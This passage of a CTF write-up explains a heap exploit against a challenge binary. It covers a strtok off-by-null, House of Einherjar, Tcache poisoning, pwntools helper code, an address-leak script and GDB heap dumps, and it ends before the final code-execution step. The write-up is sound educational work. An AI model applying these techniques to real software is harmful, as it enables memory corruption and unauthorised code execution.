bd1331eea9e034eb3d661990e25037b7  /srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  
dbd82259ea74a350bc165f75fda6195a  /lib/ld-linux-x86-64.so.2
dbd82259ea74a350bc165f75fda6195a  /opt/ld-linux-x86-64.so.2
</code></pre></div><p>There are two different versions inside the container! Now, we see it&rsquo;s Glibc 2.27:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ # cp /srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /srv/lib/x86_64-linux-gnu/libc.so.6 /opt  
/ # exit

<span class="code-cyan">$</span> <span class="code-dark-green">./ld-linux-x86-64.so.2</span> <span class="mtku">./libc.so.6</span>
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.5.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre></div><p>At this point, we can patch the binary to use this Glibc version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">chall</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">chall
</code></pre></div><h3 id="different-versions">Different versions</h3><p>It&rsquo;s worth saying that solving the challenge with Glibc 2.36 was harder than with 2.27 because of two things:</p><ul><li>Safe-linking is enabled, so we need to obfuscate and deobfuscate pointers in Tcache free-lists</li><li>Function hooks are disabled, so we need to use a less common method to achieve code execution. I used <a target="_blank" href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">TLS-storage <code>dtor_list</code></a>, which I think was the easiest way</li></ul><p>Both of the above techniques are not needed with Glibc 2.27, because there are no such mitigations enabled. However, it was a nice exercise to practice more modern techniques with up-to-date mitigations.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>We are dealing with a heap explotation challenge. In the end, we want to achieve arbitrary code execution, and for that we need an arbitrary write primitive. Consequently, we need to know the position of Glibc at runtime in order to call <code>system("/bin/sh")</code>, thus we need to be able to leak memory addresses.</p><p>The technique to leak memory addresses is quite common in heap exploitation challenges. Once a chunk is freed, one pointer appears at the <code>fd</code> field (in Tcache free-lists). This pointer is used to manage a linked list of freed chunks.</p><p>There is no Use After Free vulnerability in the program, but we can free a chunk and allocate again using the same size, so that the heap manager will give us the same chunk. At this point, we can write a single byte in the chunk, so that we only overwrite the least significant byte of the <code>fd</code> pointer. Next, since the chunk is allocated, we can use <code>do_tok</code> to read the contents of the chunk.</p><p>In order to leak Glibc addresses, the process is the same but using Unsorted Bin chunks. Here, we need to allocate chunks bigger than <code>0x80</code> (outside the range of Fast Bin) and free more than 7 chunks of this size (in order to fill the Tcache free-list). The 8th chunk will be sent to the Unsorted Bin. These freed chunks hold pointers <code>fd</code> and <code>bk</code> to some offset of <code>main_arena</code>, which is inside Glibc.</p><p>Our write primitive appears in <code>do_tok</code>. After reading the <a target="_blank" href="https://www.man7.org/linux/man-pages/man3/strtok.3.html"><code>man</code> page</a>, we can see a minor implementation flaw with the use of <code>strtok</code>:</p><blockquote><p>Be cautious when using these functions. If you do use them, note that:</p><ul><li><p>These functions modify their first argument.</p></li><li><p>These functions cannot be used on constant strings.</p></li><li><p>The identity of the delimiting byte is lost.</p></li><li><p>The <code>strtok()</code> function uses a static buffer while parsing, so it&rsquo;s not thread safe. Use <code>strtok_r()</code> if this matters to you.</p></li></ul></blockquote><p>The first point is the one that makes the program exploitable. Since <code>strtok</code> modifies the first argument, it happens that any occurrence of the separator will be replaced by a null byte.</p><p>Knowing this, we are able to overflow by a single null byte character (off-by-null). If we allocate a chunk with the maximum usable size and fill it with characters, the size field of the next chunk will be right after the string. As a result, if we indicate the size of the next chunk as delimiter for the previous chunk in <code>do_tok</code>, we will be able to modify the next chunk&rsquo;s size and start corrupting memory.</p><p>In this situation, we can perform a null-byte poison attack (House of Einherjar). This attack uses an off-by-null in the size of a chunk, so that the flags <code>AMP</code> are set to <code>0</code>. The relevant one is the <code>PREV_INUSE</code>, which tells if the previous chunk is in use or not in order to merge chunks. What we can do is place a fake chunk inside the previous chunk and a fake previous size, so that we can free the corrupted chunk and trigger consolidation.</p><p>If all security checks pass, we will achieve overlapping chunks, which allows us to modify arbitrary information of freed chunks. For instance, we can leverage this using Tcache poisoning to obtain an arbitrary write primitive.</p><h2 id="exploit-development">Exploit development</h2><p>We will be using the following helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">string</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'size? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'str? '</span><span class="mtk1">, </span><span class="mtk9 mtki">string</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'stored at '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'!'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">separator</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">list</span><span class="mtk1">[</span><span class="mtk8 mtku">bytes</span><span class="mtk1">]:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'idx? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'delim? '</span><span class="mtk1">, </span><span class="mtk9 mtki">separator</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">1. str'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">).</span><span class="mtk8">splitlines</span><span class="mtk1">()</span>  


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'idx? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>As said before, we are going to allocate more than 7 chunks with a size bigger than <code>0x80</code> and free them all, so that the Tcache free-list gets full and the rest of the chunks goes to the Unsorted Bin:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>I chose <code>0xf8</code> as usable size in order to have <code>0x100</code>-sized chunks, for later use. Moreover, I need 9 chunks because I have to allocate them again and write a single byte in order to leak memory addresses. If I had 8, the Unsorted Bin chunk will be allocated and the <code>fd</code> and <code>bk</code> pointers will be removed, because it will be empty. We can use the following string to attach GDB to the process:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>  
</code></pre></div><p>We have this heap layout:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576000</span>, size=<span class="code-magenta">0x250</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=0x7000000000000)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576250</span>, size=<span class="code-magenta">0x200</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ebca0</span>, bk=<span class="code-dark-green">0x7fd2ff7ebca0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][2/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][4/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][3/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][5/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576a60</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][6/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576a50</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][7/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576b50</span>, size=<span class="code-magenta">0x204b0</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
<span class="code-green">gef&gt; </span>bins
<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=7
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576a60</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576a50</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 7 chunks in tcache.
<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7fd2ff7ebcb0</span>]: fd=<span class="code-dark-blue">0x556137576250</span>, bk=<span class="code-dark-blue">0x556137576250</span>
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576250</span>, size=<span class="code-magenta">0x200</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ebca0</span>, bk=<span class="code-dark-green">0x7fd2ff7ebca0</span>)
<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
</code></pre></div><p>The second chunk has size <code>0x200</code> because it&rsquo;s the result of two Unsorted Bin chunks merged into one. Now, if we allocate <code>0x100</code>-sized chunks, we will take those free chunks from the Tcache until it is empty and then take the ones from the Unsorted Bin:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>  
</code></pre></div><p>Notice that the most significant bits of the <code>fd</code> and <code>bk</code> pointers are still there:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef> </span>visual-heap
<span class="code-dark-red">0x556137576000: 0x0000000000000000 0x0000000000000251 | ........Q....... |</span>
<span class="code-dark-red">0x556137576010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 35 lines, 0x230 bytes</span>
<span class="code-dark-green">0x556137576250: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576260: 0x00007fd2ff7ebe41 0x00007fd2ff7ebe90 | A.~.......~..... |</span>
<span class="code-dark-green">0x556137576270: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576350: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-blue">0x556137576360: 0x0000000000000041 0x0000000000000000 | A............... |</span>
<span class="code-dark-blue">0x556137576370: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-yellow">0x556137576450: 0x0000000000000100 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576460: 0x0000556137576541 0x0000000000000000 | AeW7aU.......... |</span>
<span class="code-dark-yellow">0x556137576470: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-red">0x556137576550: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-red">0x556137576560: 0x0000556137576641 0x0000000000000000 | AfW7aU.......... |</span>
<span class="code-dark-red">0x556137576570: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576650: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576660: 0x0000556137576741 0x0000000000000000 | AgW7aU.......... |</span>
<span class="code-dark-green">0x556137576670: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576750: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-blue">0x556137576760: 0x0000556137576841 0x0000000000000000 | AhW7aU.......... |</span>
<span class="code-dark-blue">0x556137576770: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-yellow">0x556137576850: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576860: 0x0000556137576941 0x0000000000000000 | AiW7aU.......... |</span>
<span class="code-dark-yellow">0x556137576870: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-red">0x556137576950: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-red">0x556137576960: 0x0000556137576a41 0x0000000000000000 | AjW7aU.......... |</span>
<span class="code-dark-red">0x556137576970: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576a50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576a60: 0x0000000000000041 0x0000000000000000 | A............... |</span>
<span class="code-dark-green">0x556137576a70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576b50: 0x0000000000000000 0x00000000000204b1 | ................ |  &lt;-  top</span>  
<span class="code-dark-blue">0x556137576b60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8265 lines, 0x20490 bytes</span>
</code></pre></div><p>So, we can use <code>do_tok</code> with a random separator (which won&rsquo;t be found) in order to print out those memory addresses:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk5">~</span><span class="mtk7 mtki">0x</span><span class="mtk6">fff</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">3ebe41</span>  
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>And here we have them:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-blue">*</span>] Heap base address: 0x556137576000
[<span class="code-green">+</span>] Glibc base address: 0x7fd2ff400000  
</code></pre></div><p>And they are correct according to GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap heap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span class="code-blue">ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
<span class="code-dark-blue">0x0000556137576000</span> <span class="code-dark-blue">0x0000556137597000</span> <span class="code-dark-blue">0x0000000000021000</span> <span class="code-dark-blue">0x0000000000000000</span> <span class="code-dark-blue">rw-</span> <span class="code-dark-blue">[heap]</span>
<span class="code-green">gef&gt; </span>vmmap libc
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span class="code-blue">ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
<span class="code-dark-red">0x00007fd2ff400000</span> <span class="code-dark-red">0x00007fd2ff5e7000</span> <span class="code-dark-red">0x00000000001e7000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./libc.so.6<span class="code-blue">  &lt;-  $rcx, $rip, $r10</span>  
<span class="code-grey">0x00007fd2ff5e7000</span> <span class="code-grey">0x00007fd2ff7e7000</span> <span class="code-grey">0x0000000000200000</span> <span class="code-grey">0x00000000001e7000</span> <span class="code-grey">---</span> <span class="code-grey">./libc.so.6</span>
<span class="code-blue">0x00007fd2ff7e7000</span> <span class="code-blue">0x00007fd2ff7eb000</span> <span class="code-blue">0x0000000000004000</span> <span class="code-blue">0x00000000001e7000</span> <span class="code-blue">r--</span> <span class="code-blue">./libc.so.6</span>
<span class="code-dark-green">0x00007fd2ff7eb000</span> <span class="code-dark-green">0x00007fd2ff7ed000</span> <span class="code-dark-green">0x0000000000002000</span> <span class="code-dark-green">0x00000000001eb000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">./libc.so.6</span>
